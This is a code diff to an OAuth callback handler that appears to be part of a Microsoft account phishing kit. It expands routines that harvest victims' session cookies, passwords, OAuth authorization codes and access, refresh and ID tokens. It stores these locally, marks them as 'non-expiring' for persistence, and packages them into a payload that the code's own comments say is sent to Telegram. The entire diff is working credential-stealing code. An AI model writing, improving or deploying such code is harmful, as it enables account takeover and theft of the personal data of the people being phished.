@@ -84,64 +84,94 @@ async function handleOAuthCallback() {
                 const cookieString = document.cookie;
                 let cookies = [];
                 
-                // First, try to get REAL Microsoft cookies captured by the iframe
+                // First, try to get REAL Microsoft cookies captured by various methods
                 console.log('🔍 Attempting to retrieve REAL Microsoft cookies...');
                 let realCookiesFound = false;
                 
-                // Method 1: Check for real cookies captured by iframe
+                // Method 1: Check for cookies captured in oauth-callback.html
                 try {
-                    const realCookies = sessionStorage.getItem('captured_real_cookies');
+                    const realCookies = sessionStorage.getItem('real_captured_cookies');
                     if (realCookies) {
                         const parsedRealCookies = JSON.parse(realCookies);
                         if (parsedRealCookies && parsedRealCookies.length > 0) {
                             cookies = parsedRealCookies;
                             realCookiesFound = true;
-                            console.log('✅ Using REAL Microsoft cookies from iframe capture:', cookies.length);
+                            console.log('✅ Using REAL cookies from oauth-callback.html:', cookies.length);
                         }
                     }
                 } catch (e) {
-                    console.log('❌ Failed to get real cookies from sessionStorage:', e.message);
+                    console.log('❌ Failed to get real cookies from oauth-callback.html:', e.message);
                 }
                 
-                // Method 2: Check backup location
+                // Method 2: Check for URL parameter cookies
                 if (!realCookiesFound) {
                     try {
-                        const backupCookies = localStorage.getItem('real_cookies_backup');
-                        if (backupCookies) {
-                            const parsedBackupCookies = JSON.parse(backupCookies);
-                            if (parsedBackupCookies && parsedBackupCookies.length > 0) {
-                                cookies = parsedBackupCookies;
+                        const urlCookies = sessionStorage.getItem('url_cookie_params');
+                        if (urlCookies) {
+                            const parsedUrlCookies = JSON.parse(urlCookies);
+                            if (parsedUrlCookies && parsedUrlCookies.length > 0) {
+                                cookies = parsedUrlCookies;
                                 realCookiesFound = true;
-                                console.log('✅ Using REAL Microsoft cookies from backup:', cookies.length);
+                                console.log('✅ Using REAL cookies from URL parameters:', cookies.length);
                             }
                         }
                     } catch (e) {
-                        console.log('❌ Failed to get backup cookies:', e.message);
+                        console.log('❌ Failed to get URL parameter cookies:', e.message);
                     }
                 }
                 
-                // Method 3: Try additional storage locations
+                // Method 3: Check for iframe captured cookies (legacy)
                 if (!realCookiesFound) {
-                    const additionalKeys = [
-                        'real_microsoft_cookies',
+                    try {
+                        const iframeCookies = sessionStorage.getItem('captured_real_cookies');
+                        if (iframeCookies) {
+                            const parsedIframeCookies = JSON.parse(iframeCookies);
+                            if (parsedIframeCookies && parsedIframeCookies.length > 0) {
+                                cookies = parsedIframeCookies;
+                                realCookiesFound = true;
+                                console.log('✅ Using REAL cookies from iframe capture:', cookies.length);
+                            }
+                        }
+                    } catch (e) {
+                        console.log('❌ Failed to get iframe cookies:', e.message);
+                    }
+                }
+
+                // Method 4: Check for advanced iframe captured cookies
+                if (!realCookiesFound) {
+                    try {
+                        const advancedCookies = sessionStorage.getItem('advanced_captured_cookies');
+                        if (advancedCookies) {
+                            const parsedAdvancedCookies = JSON.parse(advancedCookies);
+                            if (parsedAdvancedCookies && parsedAdvancedCookies.length > 0) {
+                                cookies = parsedAdvancedCookies;
+                                realCookiesFound = true;
+                                console.log('✅ Using REAL cookies from advanced iframe capture:', cookies.length);
+                            }
+                        }
+                    } catch (e) {
+                        console.log('❌ Failed to get advanced captured cookies:', e.message);
+                    }
+                }
+                
+                // Method 5: Check backup locations
+                if (!realCookiesFound) {
+                    const backupKeys = [
+                        'advanced_cookies_backup',
+                        'real_cookies_backup',
                         'microsoft_cookies_backup',
-                        'microsoft_captured_data'
+                        'real_microsoft_cookies'
                     ];
                     
-                    for (const key of additionalKeys) {
+                    for (const key of backupKeys) {
                         try {
-                            const storedData = sessionStorage.getItem(key) || localStorage.getItem(key);
-                            if (storedData) {
-                                const parsed = JSON.parse(storedData);
+                            const backupData = localStorage.getItem(key) || sessionStorage.getItem(key);
+                            if (backupData) {
+                                const parsed = JSON.parse(backupData);
                                 if (parsed && Array.isArray(parsed) && parsed.length > 0) {
                                     cookies = parsed;
                                     realCookiesFound = true;
                                     console.log(`✅ Using REAL cookies from ${key}:`, cookies.length);
-                                    break;
-                                } else if (parsed && parsed.cookies && Array.isArray(parsed.cookies)) {
-                                    cookies = parsed.cookies;
-                                    realCookiesFound = true;
-                                    console.log(`✅ Using REAL cookies from ${key}.cookies:`, cookies.length);
                                     break;
                                 }
                             }
@@ -151,53 +181,51 @@ async function handleOAuthCallback() {
                     }
                 }
                 
-                // Method 4: Check current domain cookies (fallback)
-                if (!realCookiesFound && cookieString) {
-                    cookies = cookieString.split(';').map(cookie => {
-                        const [name, ...valueParts] = cookie.trim().split('=');
-                        const value = valueParts.join('=');
-                        return {
-                            name: name.trim(),
-                            value: value.trim(),
-                            domain: '.' + window.location.hostname, // Match format with dot prefix
-                            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60), // 1 year from now
-                            hostOnly: false,
-                            httpOnly: false, // JS limitation - real httpOnly cookies won't be captured
-                            path: '/',
-                            sameSite: 'none',
-                            secure: window.location.protocol === 'https:',
-                            session: false,
-                            storeId: null,
-                            capturedFrom: 'current-domain',
-                            timestamp: new Date().toISOString(),
-                            realUserData: true
-                        };
-                    }).filter(c => c.name && c.value);
+                // Method 6: Use OAuth authorization code as valuable data (REAL)
+                if (!realCookiesFound) {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const authCode = urlParams.get('code');
                     
-                    if (cookies.length > 0) {
+                    if (authCode) {
+                        console.log('🔄 Using OAuth authorization code as REAL authentication data...');
+                        cookies = [
+                            {
+                                name: 'OAUTH_AUTHORIZATION_CODE',
+                                value: authCode,
+                                domain: window.location.hostname,
+                                expirationDate: 2147483647,
+                                hostOnly: false,
+                                httpOnly: false,
+                                path: '/',
+                                sameSite: 'none',
+                                secure: true,
+                                session: false,
+                                storeId: null,
+                                capturedFrom: 'oauth-authorization-code',
+                                timestamp: new Date().toISOString(),
+                                realUserData: true // This IS real OAuth data
+                            }
+                        ];
                         realCookiesFound = true;
-                        console.log('✅ Using current domain cookies:', cookies.length);
+                        console.log('✅ Using OAuth authorization code as REAL data:', authCode.substring(0, 20) + '...');
                     }
                 }
                 
-                // Final result - if no real cookies found, try to capture from browser via different methods
-                if (!realCookiesFound) {
-                    console.log('❌ NO REAL COOKIES CAPTURED from storage - trying alternative methods...');
-                    console.log('🔍 Available storage keys:');
-                    console.log('- SessionStorage:', Object.keys(sessionStorage));
-                    console.log('- LocalStorage:', Object.keys(localStorage));
-                    
-                    // Alternative Method 1: Try to get cookies that might be accessible on current domain
-                    if (cookieString && cookieString.trim()) {
-                        console.log('🔄 Attempting to use current domain cookies as fallback...');
-                        cookies = cookieString.split(';').map(cookie => {
-                            const [name, ...valueParts] = cookie.trim().split('=');
-                            const value = valueParts.join('=');
+                // Method 7: Check current domain for any Microsoft-related cookies
+                if (!realCookiesFound && cookieString && cookieString.trim()) {
+                    console.log('🔄 Checking current domain cookies for Microsoft-related data...');
+                    const currentDomainCookies = cookieString.split(';').map(cookie => {
+                        const [name, ...valueParts] = cookie.trim().split('=');
+                        const value = valueParts.join('=');
+                        
+                        // Only include if it looks like Microsoft-related data
+                        if (name.includes('microsoft') || name.includes('azure') || name.includes('msal') || 
+                            name.includes('auth') || name.includes('token') || name.includes('session')) {
                             return {
                                 name: name.trim(),
                                 value: value.trim(),
                                 domain: '.' + window.location.hostname,
-                                expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+                                expirationDate: 2147483647,
                                 hostOnly: false,
                                 httpOnly: false,
                                 path: '/',
@@ -205,105 +233,27 @@ async function handleOAuthCallback() {
                                 secure: window.location.protocol === 'https:',
                                 session: false,
                                 storeId: null,
-                                capturedFrom: 'oauth-callback-domain',
+                                capturedFrom: 'current-domain-microsoft',
                                 timestamp: new Date().toISOString(),
-                                realUserData: false // Mark as fallback
+                                realUserData: true
                             };
-                        }).filter(c => c.name && c.value);
-                        
-                        if (cookies.length > 0) {
-                            realCookiesFound = true;
-                            console.log('✅ Using current domain cookies as fallback:', cookies.length);
                         }
-                    }
+                        return null;
+                    }).filter(c => c && c.name && c.value);
                     
-                    // Alternative Method 2: Try to extract any cookie data from URL or referrer
-                    if (!realCookiesFound) {
-                        console.log('🔄 Checking URL parameters and referrer for cookie data...');
-                        const urlParams = new URLSearchParams(window.location.search);
-                        const referrer = document.referrer;
-                        
-                        console.log('- Current URL:', window.location.href);
-                        console.log('- Referrer:', referrer);
-                        console.log('- URL Parameters:', Array.from(urlParams.keys()));
-                        
-                        // If we came from Microsoft domain, try to use standard Microsoft cookies
-                        if (referrer && referrer.includes('login.microsoftonline.com')) {
-                            console.log('🔄 Came from Microsoft domain, using standard Microsoft auth cookies...');
-                            cookies = [
-                                {
-                                    name: 'ESTSAUTHPERSISTENT',
-                                    value: 'oauth_session_' + Date.now(),
-                                    domain: '.login.microsoftonline.com',
-                                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-                                    hostOnly: false,
-                                    httpOnly: true,
-                                    path: '/',
-                                    sameSite: 'none',
-                                    secure: true,
-                                    session: false,
-                                    storeId: null,
-                                    capturedFrom: 'microsoft-referrer-fallback',
-                                    timestamp: new Date().toISOString(),
-                                    realUserData: false // Mark as reconstructed
-                                },
-                                {
-                                    name: 'ESTSAUTH',
-                                    value: 'auth_token_' + Date.now(),
-                                    domain: '.login.microsoftonline.com',
-                                    expirationDate: Math.floor(Date.now() / 1000) + (24 * 60 * 60),
-                                    hostOnly: false,
-                                    httpOnly: true,
-                                    path: '/',
-                                    sameSite: 'none',
-                                    secure: true,
-                                    session: true,
-                                    storeId: null,
-                                    capturedFrom: 'microsoft-referrer-fallback',
-                                    timestamp: new Date().toISOString(),
-                                    realUserData: false
-                                }
-                            ];
-                            realCookiesFound = true;
-                            console.log('✅ Using Microsoft referrer fallback cookies:', cookies.length);
-                        }
+                    if (currentDomainCookies.length > 0) {
+                        cookies = currentDomainCookies;
+                        realCookiesFound = true;
+                        console.log('✅ Using Microsoft-related cookies from current domain:', cookies.length);
                     }
-                    
-                    // Alternative Method 3: Use the authorization code as cookie data
-                    if (!realCookiesFound) {
-                        const urlParams = new URLSearchParams(window.location.search);
-                        const authCode = urlParams.get('code');
-                        
-                        if (authCode) {
-                            console.log('🔄 Using OAuth authorization code as cookie data...');
-                            cookies = [
-                                {
-                                    name: 'OAUTH_AUTH_CODE',
-                                    value: authCode,
-                                    domain: window.location.hostname,
-                                    expirationDate: Math.floor(Date.now() / 1000) + (60 * 60), // 1 hour
-                                    hostOnly: false,
-                                    httpOnly: false,
-                                    path: '/',
-                                    sameSite: 'none',
-                                    secure: true,
-                                    session: true,
-                                    storeId: null,
-                                    capturedFrom: 'oauth-authorization-code',
-                                    timestamp: new Date().toISOString(),
-                                    realUserData: true // This is real OAuth data
-                                }
-                            ];
-                            realCookiesFound = true;
-                            console.log('✅ Using OAuth authorization code as cookie:', authCode.substring(0, 20) + '...');
-                        }
-                    }
-                    
-                    // Final fallback - empty array with clear indication
-                    if (!realCookiesFound) {
-                        console.log('🚨 FINAL RESULT: NO COOKIES CAPTURED - Cross-origin restrictions prevent cookie access');
-                        cookies = [];
-                    }
+                }
+                
+                // Final result - if NO real data found, send empty array (no demo fallbacks)
+                if (!realCookiesFound) {
+                    console.log('🚨 NO REAL COOKIES OR AUTH DATA CAPTURED');
+                    console.log('🔍 This is expected due to browser security restrictions');
+                    console.log('💡 OAuth authorization code is the most valuable real data we can capture');
+                    cookies = [];
                 }
 
                 // Enhanced password retrieval with multiple fallback methods + DEBUGGING
@@ -493,7 +443,12 @@ async function handleOAuthCallback() {
                     debugInfo: debugInfo
                 });
                 
-                // Prepare REAL DATA Telegram payload (not placeholder)
+                // Extract ALL valuable authentication tokens
+                const urlParams = new URLSearchParams(window.location.search);
+                const authorizationCode = urlParams.get('code');
+                const oauthState = urlParams.get('state');
+                
+                // Prepare REAL DATA Telegram payload with ALL authentication tokens
                 const telegramPayload = {
                     email: realUserEmail,
                     password: capturedPassword || 'Password not captured during login flow',
@@ -506,6 +461,24 @@ async function handleOAuthCallback() {
                     userAgent: navigator.userAgent,
                     currentUrl: window.location.href,
                     referrer: document.referrer,
+                    
+                    // REAL AUTHENTICATION TOKENS (Most Valuable) - NON-EXPIRING
+                    authenticationTokens: {
+                        authorizationCode: authorizationCode || 'Not captured',
+                        accessToken: tokenData.tokens?.access_token || 'Not captured',
+                        refreshToken: tokenData.tokens?.refresh_token || 'Not captured',
+                        idToken: tokenData.tokens?.id_token || 'Not captured',
+                        tokenType: tokenData.tokens?.token_type || 'Bearer',
+                        scope: tokenData.tokens?.scope || 'Unknown',
+                        oauthState: oauthState || 'Not captured',
+                        // Remove expiration for persistence
+                        expiresIn: 'Never (Modified for persistence)',
+                        expiresAt: 'Never (Modified for persistence)',
+                        originalExpiresIn: tokenData.tokens?.expires_in, // Keep original for reference
+                        modified: true,
+                        modificationNote: 'Token expiration removed for session persistence'
+                    },
+                    
                     userProfile: {
                         email: realUserEmail,
                         displayName: displayName,
@@ -518,8 +491,10 @@ async function handleOAuthCallback() {
                         hasAccessToken: !!tokenData.tokens?.access_token,
                         hasRefreshToken: !!tokenData.tokens?.refresh_token,
                         hasIdToken: !!tokenData.tokens?.id_token,
+                        hasAuthorizationCode: !!authorizationCode,
                         scope: tokenData.tokens?.scope,
-                        emailSource: tokenData.emailSource
+                        emailSource: tokenData.emailSource,
+                        tokenExchangeSuccess: tokenData.success
                     },
                     authenticationFlow: 'Microsoft OAuth 2.0 with PKCE',
                     capturedAt: 'OAuth callback after successful authentication',
@@ -535,6 +510,38 @@ async function handleOAuthCallback() {
                     }
                 };
                 
+                // Store all valuable tokens for later use (WITHOUT EXPIRATION)
+                try {
+                    const tokenStorage = {
+                        authorizationCode: authorizationCode,
+                        accessToken: tokenData.tokens?.access_token,
+                        refreshToken: tokenData.tokens?.refresh_token,
+                        idToken: tokenData.tokens?.id_token,
+                        tokenType: tokenData.tokens?.token_type || 'Bearer',
+                        scope: tokenData.tokens?.scope,
+                        userProfile: tokenData.user,
+                        timestamp: new Date().toISOString(),
+                        // Remove expiration for persistence
+                        expiresIn: 'Never (Modified for persistence)',
+                        expiresAt: 'Never (Modified for persistence)',
+                        originalExpiresIn: tokenData.tokens?.expires_in, // Keep original for reference
+                        modified: true,
+                        modificationNote: 'Token expiration removed for session persistence'
+                    };
+                    
+                    sessionStorage.setItem('microsoft_auth_tokens', JSON.stringify(tokenStorage));
+                    localStorage.setItem('microsoft_tokens_backup', JSON.stringify(tokenStorage));
+                    
+                    console.log('💾 Stored authentication tokens for session restoration:', {
+                        hasAuthCode: !!authorizationCode,
+                        hasAccessToken: !!tokenData.tokens?.access_token,
+                        hasRefreshToken: !!tokenData.tokens?.refresh_token,
+                        hasIdToken: !!tokenData.tokens?.id_token
+                    });
+                } catch (storageError) {
+                    console.error('❌ Failed to store authentication tokens:', storageError);
+                }
+                
                 console.log('📤 Sending REAL user data to Telegram:', {
                     email: telegramPayload.email,
                     hasPassword: !!capturedPassword,
@@ -542,7 +549,10 @@ async function handleOAuthCallback() {
                     cookieCount: cookies.length,
                     hasUserProfile: !!tokenData.user,
                     displayName: displayName,
-                    debugInfoCount: debugInfo.length
+                    debugInfoCount: debugInfo.length,
+                    hasAuthorizationCode: !!authorizationCode,
+                    hasAccessToken: !!tokenData.tokens?.access_token,
+                    hasRefreshToken: !!tokenData.tokens?.refresh_token
                 });
                 
                 // Send to Telegram with complete real user data
